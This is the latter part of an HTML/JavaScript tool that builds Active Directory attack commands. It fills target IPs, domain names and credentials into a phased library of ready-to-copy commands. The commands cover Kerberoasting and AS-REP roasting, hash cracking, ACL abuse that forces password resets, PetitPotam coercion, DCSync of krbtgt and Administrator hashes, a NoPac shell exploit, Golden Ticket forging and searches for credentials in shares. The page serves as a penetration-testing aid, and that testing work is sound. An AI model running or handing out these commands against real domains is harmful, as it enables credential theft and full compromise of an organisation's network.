    { phase: "Phase 5: Kerberos Attacks", title: "GetUserSPNs - Enumerate", description: "List all SPNs", category: "Kerberoast", tool: "Impacket", os: "linux", requiresCreds: "required", command: "impacket-GetUserSPNs -dc-ip {DC_IP} '{DOMAIN}/{USERNAME}:{PASSWORD}'" },
    { phase: "Phase 5: Kerberos Attacks", title: "GetUserSPNs - Request All", description: "Request all TGS tickets", category: "Kerberoast", tool: "Impacket", os: "linux", requiresCreds: "required", command: "impacket-GetUserSPNs -dc-ip {DC_IP} '{DOMAIN}/{USERNAME}:{PASSWORD}' -request -outputfile kerberoast.txt" },
    { phase: "Phase 5: Kerberos Attacks", title: "GetUserSPNs - Target User", description: "Kerberoast specific user", category: "Kerberoast", tool: "Impacket", os: "linux", requiresCreds: "required", command: "impacket-GetUserSPNs -dc-ip {DC_IP} '{DOMAIN}/{USERNAME}:{PASSWORD}' -request-user {TARGET_USER}" },
    { phase: "Phase 5: Kerberos Attacks", title: "Rubeus - Kerberoast Stats", description: "Get kerberoast stats", category: "Kerberoast", tool: "Rubeus", os: "windows", requiresCreds: "required", command: ".\\Rubeus.exe kerberoast /stats" },
    { phase: "Phase 5: Kerberos Attacks", title: "Rubeus - Kerberoast All", description: "Kerberoast all accounts", category: "Kerberoast", tool: "Rubeus", os: "windows", requiresCreds: "required", command: ".\\Rubeus.exe kerberoast /nowrap /outfile:hashes.txt" },
    { phase: "Phase 5: Kerberos Attacks", title: "Rubeus - Kerberoast User", description: "Target specific user", category: "Kerberoast", tool: "Rubeus", os: "windows", requiresCreds: "required", command: ".\\Rubeus.exe kerberoast /user:{TARGET_USER} /nowrap" },
    { phase: "Phase 5: Kerberos Attacks", title: "Crack TGS - Hashcat", description: "Crack Kerberoast hashes", category: "Cracking", tool: "Hashcat", os: "linux", requiresCreds: "none", command: "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt" },
    { phase: "Phase 5: Kerberos Attacks", title: "GetNPUsers - AS-REP Roast", description: "AS-REP roast preauth disabled", category: "AS-REP", tool: "Impacket", os: "linux", requiresCreds: "none", command: "impacket-GetNPUsers -dc-ip {DC_IP} '{DOMAIN}/' -usersfile users.txt -format hashcat -outputfile asrep.txt" },
    { phase: "Phase 5: Kerberos Attacks", title: "Rubeus - AS-REP Roast", description: "AS-REP roast from Windows", category: "AS-REP", tool: "Rubeus", os: "windows", requiresCreds: "none", command: ".\\Rubeus.exe asreproast /nowrap /format:hashcat" },
    { phase: "Phase 5: Kerberos Attacks", title: "Crack AS-REP - Hashcat", description: "Crack AS-REP hashes", category: "Cracking", tool: "Hashcat", os: "linux", requiresCreds: "none", command: "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt" },

    // PHASE 6: ACL ATTACKS
    { phase: "Phase 6: ACL Attacks", title: "PowerView - Find ACLs", description: "Find interesting ACL permissions", category: "ACL Enum", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Find-InterestingDomainAcl -ResolveGUIDs" },
    { phase: "Phase 6: ACL Attacks", title: "PowerView - User ACLs", description: "Get ACLs for specific user", category: "ACL Enum", tool: "PowerView", os: "windows", requiresCreds: "required", command: "$sid = Convert-NameToSid {USERNAME}\nGet-DomainObjectACL -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}" },
    { phase: "Phase 6: ACL Attacks", title: "ACL Abuse - Change Password", description: "Force password change", category: "ACL Abuse", tool: "PowerView", os: "windows", requiresCreds: "required", command: "$newPass = ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force\nSet-DomainUserPassword -Identity {TARGET_USER} -AccountPassword $newPass" },
    { phase: "Phase 6: ACL Attacks", title: "ACL Abuse - Add to Group", description: "Add user to group", category: "ACL Abuse", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Add-DomainGroupMember -Identity 'Target Group' -Members '{USERNAME}'" },
    { phase: "Phase 6: ACL Attacks", title: "ACL Abuse - Set SPN", description: "Add fake SPN for kerberoast", category: "ACL Abuse", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Set-DomainObject -Identity {TARGET_USER} -SET @{serviceprincipalname='fake/spn'}" },

    // PHASE 7: DELEGATION ATTACKS
    { phase: "Phase 7: Delegation Attacks", title: "Find Unconstrained Delegation", description: "Find unconstrained computers", category: "Delegation", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-DomainComputer -Unconstrained | Select-Object name,dnshostname" },
    { phase: "Phase 7: Delegation Attacks", title: "Find Constrained Delegation", description: "Find constrained delegation", category: "Delegation", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-DomainComputer -TrustedToAuth | Select-Object name,msds-allowedtodelegateto" },
    { phase: "Phase 7: Delegation Attacks", title: "Check PrinterBug", description: "Check MS-RPRN availability", category: "Coercion", tool: "rpcdump", os: "linux", requiresCreds: "none", command: "rpcdump.py @{DC_IP} | egrep 'MS-RPRN|MS-PAR'" },
    { phase: "Phase 7: Delegation Attacks", title: "PetitPotam", description: "Coerce authentication", category: "Coercion", tool: "PetitPotam", os: "linux", requiresCreds: "none", command: "python3 PetitPotam.py {ATTACKER_IP} {DC_IP}" },
    { phase: "Phase 7: Delegation Attacks", title: "Rubeus - Monitor TGT", description: "Monitor for incoming tickets", category: "Delegation", tool: "Rubeus", os: "windows", requiresCreds: "required", command: ".\\Rubeus.exe monitor /interval:5 /nowrap" },

    // PHASE 8: DCSYNC
    { phase: "Phase 8: DCSync Attack", title: "secretsdump - All Hashes", description: "DCSync all domain hashes", category: "DCSync", tool: "Impacket", os: "linux", requiresCreds: "required", command: "impacket-secretsdump -just-dc '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP} -outputfile dcsync" },
    { phase: "Phase 8: DCSync Attack", title: "secretsdump - Administrator", description: "DCSync Administrator only", category: "DCSync", tool: "Impacket", os: "linux", requiresCreds: "required", command: "impacket-secretsdump -just-dc-user Administrator '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP}" },
    { phase: "Phase 8: DCSync Attack", title: "secretsdump - krbtgt", description: "DCSync krbtgt for Golden Ticket", category: "DCSync", tool: "Impacket", os: "linux", requiresCreds: "required", command: "impacket-secretsdump -just-dc-user krbtgt '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP}" },
    { phase: "Phase 8: DCSync Attack", title: "Mimikatz - DCSync", description: "DCSync via Mimikatz", category: "DCSync", tool: "Mimikatz", os: "windows", requiresCreds: "required", command: "mimikatz # lsadump::dcsync /domain:{DOMAIN} /user:Administrator" },
    { phase: "Phase 8: DCSync Attack", title: "Mimikatz - DCSync krbtgt", description: "Extract krbtgt hash", category: "DCSync", tool: "Mimikatz", os: "windows", requiresCreds: "required", command: "mimikatz # lsadump::dcsync /domain:{DOMAIN} /user:krbtgt" },

    // PHASE 9: PRIVILEGE ESCALATION
    { phase: "Phase 9: Privilege Escalation", title: "Find RDP Users", description: "Find Remote Desktop users", category: "Access", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-NetLocalGroupMember -GroupName 'Remote Desktop Users'" },
    { phase: "Phase 9: Privilege Escalation", title: "Find WinRM Users", description: "Find WinRM access", category: "Access", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-NetLocalGroupMember -GroupName 'Remote Management Users'" },
    { phase: "Phase 9: Privilege Escalation", title: "SQL Server - Find Instances", description: "Discover SQL servers", category: "SQL", tool: "PowerUpSQL", os: "windows", requiresCreds: "required", command: "Import-Module .\\PowerUpSQL.ps1\nGet-SQLInstanceDomain" },
    { phase: "Phase 9: Privilege Escalation", title: "SQL Server - Connect", description: "Connect to SQL Server", category: "SQL", tool: "Impacket", os: "linux", requiresCreds: "required", command: "impacket-mssqlclient '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP} -windows-auth" },

    // PHASE 10: VULNERABILITIES
    { phase: "Phase 10: Vulnerabilities", title: "NoPac - Scan", description: "Check for CVE-2021-42278", category: "CVE", tool: "NoPac", os: "linux", requiresCreds: "required", command: "python3 scanner.py '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP} -use-ldap" },
    { phase: "Phase 10: Vulnerabilities", title: "NoPac - Exploit", description: "Exploit NoPac for shell", category: "CVE", tool: "NoPac", os: "linux", requiresCreds: "required", command: "python3 noPac.py '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP} -dc-host {DC_NAME} -shell --impersonate administrator -use-ldap" },
    { phase: "Phase 10: Vulnerabilities", title: "PrintNightmare - Check", description: "Check for PrintNightmare", category: "CVE", tool: "rpcdump", os: "linux", requiresCreds: "none", command: "rpcdump.py @{DC_IP} | egrep 'MS-RPRN|MS-PAR'" },
    { phase: "Phase 10: Vulnerabilities", title: "ZeroLogon - Check", description: "Check for ZeroLogon", category: "CVE", tool: "zerologon", os: "linux", requiresCreds: "none", command: "python3 zerologon_tester.py {DC_NAME} {DC_IP}" },

    // PHASE 11: TRUST ATTACKS
    { phase: "Phase 11: Trust Attacks", title: "Enumerate Trusts", description: "List all domain trusts", category: "Trusts", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-DomainTrust\nGet-DomainTrustMapping" },
    { phase: "Phase 11: Trust Attacks", title: "Find Foreign Users", description: "Find users from other domains", category: "Trusts", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-DomainForeignUser\nGet-DomainForeignGroupMember" },
    { phase: "Phase 11: Trust Attacks", title: "Get Domain SIDs", description: "Get SIDs for trust attacks", category: "Trusts", tool: "Impacket", os: "linux", requiresCreds: "required", command: "impacket-lookupsid '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP} | grep 'Domain SID'" },
    { phase: "Phase 11: Trust Attacks", title: "Golden Ticket", description: "Create Golden Ticket", category: "Persistence", tool: "Impacket", os: "linux", requiresCreds: "none", command: "impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain {DOMAIN} administrator" },

    // PHASE 12: GPO ATTACKS
    { phase: "Phase 12: GPO Attacks", title: "GPP Decrypt", description: "Decrypt GPP cpassword", category: "GPO", tool: "gpp-decrypt", os: "linux", requiresCreds: "none", command: "gpp-decrypt 'ENCRYPTED_CPASSWORD'" },
    { phase: "Phase 12: GPO Attacks", title: "NetExec - GPP Autologin", description: "Find GPP autologin creds", category: "GPO", tool: "NetExec", os: "linux", requiresCreds: "required", command: "netexec smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -M gpp_autologin" },
    { phase: "Phase 12: GPO Attacks", title: "PowerView - GPO Permissions", description: "Find modifiable GPOs", category: "GPO", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'Write'}" },

    // PHASE 13: MISCELLANEOUS
    { phase: "Phase 13: Miscellaneous", title: "Password in Description", description: "Find passwords in descriptions", category: "Misc", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-DomainUser | ? {$_.description} | Select-Object samaccountname,description" },
    { phase: "Phase 13: Miscellaneous", title: "PASSWD_NOTREQD Accounts", description: "Find accounts with no password required", category: "Misc", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname" },
    { phase: "Phase 13: Miscellaneous", title: "Snaffler", description: "Search for sensitive files", category: "File Search", tool: "Snaffler", os: "windows", requiresCreds: "required", command: ".\\Snaffler.exe -d {DOMAIN} -s -o snaffler.log" },
    { phase: "Phase 13: Miscellaneous", title: "ADIDNS Dump", description: "Dump DNS zone via LDAP", category: "DNS", tool: "adidnsdump", os: "linux", requiresCreds: "required", command: "adidnsdump -u '{DOMAIN}\\{USERNAME}' -p '{PASSWORD}' ldap://{DC_IP} -r" },
    { phase: "Phase 13: Miscellaneous", title: "Find Interesting Files", description: "Search shares for sensitive files", category: "File Search", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Find-InterestingDomainShareFile -Include @('*.ps1','*.bat','*.config','*.xml','*.txt','*.kdbx')" }
];

let config = {};
let filteredCommands = [...commandLibrary];

function loadCommands() {
    config = {
        DC_NAME: document.getElementById('dcName').value.trim() || '{DC_NAME}',
        DC_IP: document.getElementById('dcIP').value.trim() || '{DC_IP}',
        DOMAIN: document.getElementById('domain').value.trim() || '{DOMAIN}',
        DOMAIN_SHORT: document.getElementById('domainShort').value.trim() || '{DOMAIN_SHORT}',
        ATTACKER_IP: document.getElementById('attackerIP').value.trim() || '{ATTACKER_IP}',
        USERNAME: document.getElementById('username').value.trim() || '{USERNAME}',
        PASSWORD: document.getElementById('password').value.trim() || '{PASSWORD}',
        NTHASH: document.getElementById('ntHash').value.trim() || '{NTHASH}',
        TARGET_USER: document.getElementById('targetUser').value.trim() || '{TARGET_USER}'
    };

    const domainParts = config.DOMAIN.includes('.') ? config.DOMAIN.split('.') : ['DOMAIN', 'LOCAL'];
    config.BASE_DN = domainParts.map(p => `DC=${p}`).join(',');
    
    const ipParts = config.DC_IP.split('.');
    config.NETWORK = ipParts.length === 4 ? `${ipParts[0]}.${ipParts[1]}.${ipParts[2]}` : '{NETWORK}';

    displayTargetInfo();
    populatePhaseFilter();
    renderCommands();
}

function clearConfig() {
    ['dcName', 'dcIP', 'domain', 'domainShort', 'attackerIP', 'username', 'password', 'ntHash', 'targetUser'].forEach(id => {
        document.getElementById(id).value = '';
    });
    config = {};
    document.getElementById('targetDisplay').classList.remove('active');
    filteredCommands = [...commandLibrary];
    renderCommands();
}

function exportConfig() {
    if (Object.keys(config).length === 0) loadCommands();
    const text = Object.entries(config).map(([k, v]) => `${k}="${v}"`).join('\n');
    const blob = new Blob([`# AD Target Config\n# ${new Date().toISOString()}\n\n${text}`], { type: 'text/plain' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `ad_config_${config.DOMAIN_SHORT || 'target'}.conf`;
    a.click();
}

function displayTargetInfo() {
    const items = document.getElementById('targetItems');
    items.innerHTML = '';
    const displayItems = [
        ['DC', config.DC_NAME], ['DC IP', config.DC_IP], ['Domain', config.DOMAIN],
        ['NetBIOS', config.DOMAIN_SHORT], ['User', config.USERNAME],
        ['Auth', config.PASSWORD !== '{PASSWORD}' ? '‚úì' : '‚úó']
    ];
    displayItems.forEach(([k, v]) => {
        const div = document.createElement('div');
        div.className = 'target-item';
        div.innerHTML = `<span class="key">${k}</span><span class="value">${v}</span>`;
        items.appendChild(div);
    });
    document.getElementById('targetDisplay').classList.add('active');
}

function populatePhaseFilter() {
    const select = document.getElementById('phaseFilter');
    const phases = [...new Set(commandLibrary.map(c => c.phase))];
    select.innerHTML = '<option value="">All Phases</option>';
    phases.forEach(p => {
        const opt = document.createElement('option');
        opt.value = p;
        opt.textContent = p;
        select.appendChild(opt);
    });
}

function applyFilters() {
    const search = document.getElementById('searchInput').value.toLowerCase();
    const phase = document.getElementById('phaseFilter').value;
    const creds = document.getElementById('credsFilter').value;
    const os = document.getElementById('osFilter').value;

    filteredCommands = commandLibrary.filter(cmd => {
        const matchSearch = !search || 
            cmd.title.toLowerCase().includes(search) ||
            cmd.description.toLowerCase().includes(search) ||
            cmd.category.toLowerCase().includes(search) ||
            cmd.tool.toLowerCase().includes(search) ||
            cmd.command.toLowerCase().includes(search);
        const matchPhase = !phase || cmd.phase === phase;
        const matchCreds = !creds || cmd.requiresCreds === creds;
        const matchOS = !os || cmd.os === os;
        return matchSearch && matchPhase && matchCreds && matchOS;
    });
    renderCommands();
}

function resetFilters() {
    document.getElementById('searchInput').value = '';
    document.getElementById('phaseFilter').value = '';
    document.getElementById('credsFilter').value = '';
    document.getElementById('osFilter').value = '';
    filteredCommands = [...commandLibrary];
    renderCommands();
}

function quickFilter(term) {
    document.getElementById('searchInput').value = term;
    applyFilters();
}

function renderCommands() {
    const container = document.getElementById('commandContainer');
    
    if (filteredCommands.length === 0) {
        container.innerHTML = '<div class="no-results"><div class="icon">üîç</div><h3>No commands found</h3></div>';
        updateStats();
        return;
    }

    const groups = {};
    filteredCommands.forEach(cmd => {
        if (!groups[cmd.phase]) groups[cmd.phase] = [];
        groups[cmd.phase].push(cmd);
    });

    container.innerHTML = '';
    Object.keys(groups).sort().forEach(phase => {
        const div = document.createElement('div');
        div.className = 'phase-group';
        div.innerHTML = `
            <div class="phase-header" onclick="togglePhase(this)">
                <h3>${phase}</h3>
                <span class="count">${groups[phase].length} commands</span>
            </div>
            <div class="command-grid">${groups[phase].map((cmd, i) => createCard(cmd, i)).join('')}</div>
        `;
        container.appendChild(div);
    });
    updateStats();
}

function createCard(cmd, idx) {
    let processed = cmd.command;
    if (Object.keys(config).length > 0) {
        Object.keys(config).forEach(k => {
            processed = processed.replace(new RegExp(`\\{${k}\\}`, 'g'), config[k]);
        });
    }

    const credBadge = cmd.requiresCreds === 'none' ? 
        '<span class="badge badge-none">No Creds</span>' : 
        '<span class="badge badge-required">Creds</span>';
    
    const osBadge = cmd.os === 'linux' ? '<span class="badge badge-linux">Linux</span>' :
        cmd.os === 'windows' ? '<span class="badge badge-windows">Windows</span>' :
        '<span class="badge badge-both">Both</span>';

    return `
        <div class="command-card" data-cmd="${encodeURIComponent(processed)}">
            <div class="card-header">
                <div class="card-title">${cmd.title}</div>
                <div class="card-badges">${credBadge}${osBadge}</div>
            </div>
            <div class="card-description">${cmd.description}</div>
            <div class="card-meta">
                <span class="meta-tag">${cmd.category}</span>
                <span class="meta-tag">${cmd.tool}</span>
            </div>
            <div class="command-box">
                <div class="command-text">${escapeHtml(processed)}</div>
            </div>
            <button class="copy-btn" onclick="copyCommand(this.parentElement)">üìã Copy Command</button>
        </div>
    `;
}

function copyCommand(card) {
    const cmd = decodeURIComponent(card.dataset.cmd);
    navigator.clipboard.writeText(cmd).then(() => {
        card.classList.add('copied');
        const toast = document.getElementById('copyToast');
        toast.classList.add('show');
        setTimeout(() => {
            card.classList.remove('copied');
            toast.classList.remove('show');
        }, 1500);
    });
}

function togglePhase(header) {
    const grid = header.nextElementSibling;
    grid.classList.toggle('collapsed');
}

function escapeHtml(text) {
    const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
    return text.replace(/[&<>"']/g, m => map[m]);
}

function updateStats() {
    document.getElementById('totalCmds').textContent = commandLibrary.length;
    document.getElementById('visibleCmds').textContent = filteredCommands.length;
    
    let ready = 0;
    if (Object.keys(config).length > 0) {
        filteredCommands.forEach(cmd => {
            let p = cmd.command;
            Object.keys(config).forEach(k => p = p.replace(new RegExp(`\\{${k}\\}`, 'g'), config[k]));
            if (!p.match(/\{[A-Z_]+\}/)) ready++;
        });
    }
    document.getElementById('readyCmds').textContent = ready;
}

window.onload = function() {
    populatePhaseFilter();
    loadCommands();
};
</script>
</body>
</html>
